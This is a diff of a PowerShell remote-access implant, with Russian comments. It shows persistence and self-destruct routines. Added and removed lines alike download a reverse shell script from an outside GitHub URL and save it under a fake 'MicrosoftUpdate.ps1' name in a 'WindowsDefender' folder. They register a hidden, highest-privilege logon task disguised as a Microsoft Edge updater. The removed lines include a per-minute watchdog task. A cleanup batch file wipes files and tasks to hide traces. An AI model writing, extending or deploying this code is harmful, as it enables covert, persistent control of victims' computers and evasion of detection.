@@ -359,50 +359,20 @@ function PortSuggest {
             New-Item -ItemType Directory -Path $folder -Force | Out-Null
         }
 
-        # Основной payload
-        $mainScriptPath = Join-Path $folder "MicrosoftUpdate.ps1"
-        $payloadUrl = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
-        Invoke-WebRequest -Uri $payloadUrl -UseBasicParsing -OutFile $mainScriptPath
+        $targetPath = Join-Path $folder "MicrosoftUpdate.ps1"
+        $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
+        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
-        # Watchdog (проверка выполнения)
-        $watchdogPath = Join-Path $folder "Watchdog.ps1"
-        $watchdogContent = @"
-\$targetPath = "`"$mainScriptPath`""
-\$procCheck = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { \$_.Path -eq \$targetPath }
-if (-not \$procCheck) {
-    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File \$targetPath"
-}
-"@
-        $watchdogContent | Set-Content -Path $watchdogPath -Encoding ASCII
+        $taskName = "MicrosoftEdgeUpdateChecker"
 
-        # ONLOGON задача (обновляет и запускает основной payload)
-        $bootTaskName = "MicrosoftEdgeUpdateChecker"
-        schtasks /Query /TN $bootTaskName 2>$null
+        schtasks /Query /TN $taskName 2>$null
         if ($LASTEXITCODE -ne 0) {
-            $bootScript = Join-Path $folder "Bootloader.ps1"
-            $bootContent = @"
-\$url = '$payloadUrl'
-\$dest = '$mainScriptPath'
-Invoke-WebRequest -Uri \$url -UseBasicParsing -OutFile \$dest
-Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$dest`""
-"@
-            $bootContent | Set-Content -Path $bootScript -Encoding ASCII
-
-            schtasks /Create /TN $bootTaskName /SC ONLOGON `
-                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$bootScript`"" `
+            schtasks /Create /TN $taskName /SC ONLOGON `
+                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
                 /RL HIGHEST /F | Out-Null
         }
 
-        # WATCHDOG задача, проверяющая каждую минуту
-        $watchdogTaskName = "MicrosoftRuntimeMonitor"
-        schtasks /Query /TN $watchdogTaskName 2>$null
-        if ($LASTEXITCODE -ne 0) {
-            schtasks /Create /TN $watchdogTaskName /SC MINUTE /MO 1 `
-                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`"" `
-                /RL HIGHEST /F | Out-Null
-        }
-
-        return "[+] Persistence established: bootloader + watchdog active"
+        return "[+] Persistence established successfully!"
     }
     catch {
         return "[ERROR] Persistence failed: $($_.Exception.Message)"
@@ -611,42 +581,28 @@ function Update-Self {
 
     function Self-Destruct {
     try {
-        $folder = "$env:APPDATA\WindowsDefender"
-        $mainScript = Join-Path $folder "MicrosoftUpdate.ps1"
-        $watchdogScript = Join-Path $folder "Watchdog.ps1"
-        $bootloaderScript = Join-Path $folder "Bootloader.ps1"
-        $cleanupBat = Join-Path $folder "cleanup.bat"
-
-        $taskBoot = "MicrosoftEdgeUpdateChecker"
-        $taskWatchdog = "MicrosoftRuntimeMonitor"
-        $taskCleanup = "ZiPo_Cleanup"
-
-        # Определяем путь текущего скрипта
         $scriptPath = $MyInvocation.MyCommand.Path
         if (-not $scriptPath) {
-            $scriptPath = $mainScript
+            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
         }
 
-        # Создаём .bat-файл для отложенного удаления
+        $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
+        $taskName = "MicrosoftEdgeUpdateChecker"
+        $cleanupTask = "ZiPo_Cleanup"
+
         $batContent = @"
 @echo off
 timeout /t 5 >nul
-del "$mainScript" /f /q >nul 2>&1
-del "$watchdogScript" /f /q >nul 2>&1
-del "$bootloaderScript" /f /q >nul 2>&1
-del "$scriptPath" /f /q >nul 2>&1
-del "%~f0" /f /q >nul 2>&1
-schtasks /Delete /TN "$taskBoot" /F >nul 2>&1
-schtasks /Delete /TN "$taskWatchdog" /F >nul 2>&1
-schtasks /Delete /TN "$taskCleanup" /F >nul 2>&1
-rmdir "$folder" /s /q >nul 2>&1
+del "$scriptPath" /f /q
+schtasks /Delete /TN "$taskName" /F >nul 2>&1
+del "%~f0" /f /q
+schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 "@
 
         $batContent | Set-Content -Path $cleanupBat -Encoding ASCII
 
-        # Планируем задачу, которая выполнит cleanup.bat
-        $time = (Get-Date).AddMinutes(1).ToString("HH:mm")
-        schtasks /Create /TN $taskCleanup /SC ONCE /TR "`"$cleanupBat`"" /ST $time /RL HIGHEST /F | Out-Null
+        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
+            /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null
 
         Start-Sleep -Seconds 1
         Stop-Process -Id $PID -Force
@@ -686,7 +642,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            PRES tests                                                                                                                                                                    
+                                            LOG CON TEST                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
